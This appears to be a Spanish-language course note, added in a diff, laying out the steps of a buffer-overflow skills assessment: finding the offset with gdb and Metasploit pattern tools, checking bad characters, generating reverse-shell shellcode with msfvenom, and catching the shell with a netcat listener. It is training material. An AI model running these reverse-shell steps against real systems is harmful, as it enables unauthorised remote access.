@@ -1,0 +1,115 @@
+# Skills Assessment
+
+La evaluación práctica pone a prueba todos los conceptos aprendidos en el módulo.
+
+## Objetivos
+
+1. Identificar vulnerabilidad de buffer overflow
+2. Determinar el offset exacto
+3. Identificar bad characters
+4. Generar shellcode funcional
+5. Obtener acceso al sistema
+
+## Metodología
+
+### Paso 1: Análisis Inicial
+
+```bash
+file <binary>
+strings <binary>
+gdb -q <binary>
+```
+
+### Paso 2: Identificar Función Vulnerable
+
+```bash
+(gdb) disassemble main
+(gdb) disassemble <funcion>
+```
+
+### Paso 3: Determinar Offset
+
+```bash
+# Crear patrón
+pattern_create.rb -l 2000
+
+# Ejecutar y obtener EIP
+(gdb) run $(cat pattern.txt)
+(gdb) info registers eip
+
+# Calcular offset
+pattern_offset.rb -q 0x<eip_value>
+```
+
+### Paso 4: Bad Characters
+
+```bash
+# Crear lista de todos los bytes
+# Enviar payload con CHARS
+# Examinar stack para encontrar roturas
+(gdb) x/500xb $esp+offset
+```
+
+### Paso 5: Generar Shellcode
+
+```bash
+msfvenom -p linux/x86/shell_reverse_tcp \
+  LHOST=<IP> LPORT=<PORT> \
+  --arch x86 --platform linux \
+  --bad-chars "<bad_chars>" \
+  -f c
+```
+
+### Paso 6: Encontrar Return Address
+
+```bash
+(gdb) run $(python -c 'print "<payload>"')
+(gdb) info registers esp
+(gdb) x/200xb $esp
+```
+
+### Paso 7: Exploit Final
+
+```bash
+# Listener
+nc -lvnp <PORT>
+
+# Ejecutar exploit
+./<binary> $(python exploit.py)
+```
+
+## Checklist de Éxito
+
+| Tarea | Completado |
+|-------|------------|
+| Offset identificado | [ ] |
+| Bad characters encontrados | [ ] |
+| Shellcode generado | [ ] |
+| Return address calculada | [ ] |
+| Reverse shell obtenida | [ ] |
+
+## Comandos Clave
+
+| Comando | Propósito |
+|---------|-----------|
+| `pattern_create.rb -l N` | Crear patrón único |
+| `pattern_offset.rb -q ADDR` | Calcular offset |
+| `msfvenom -p ...` | Generar shellcode |
+| `x/Nxb $esp` | Examinar stack |
+| `info registers eip` | Ver EIP |
+| `nc -lvnp PORT` | Listener netcat |
+
+## Troubleshooting
+
+| Problema | Solución |
+|----------|----------|
+| EIP no sobrescrito | Aumentar tamaño del buffer |
+| Shellcode no ejecuta | Verificar bad chars |
+| Conexión rechazada | Verificar firewall/LPORT |
+| Crash sin shell | Verificar return address |
+
+## Recursos
+
+- [Exploit Database](https://www.exploit-db.com/)
+- [Metasploit Framework](https://www.metasploit.com/)
+- [Shell Storm](http://shell-storm.org/shellcode/)
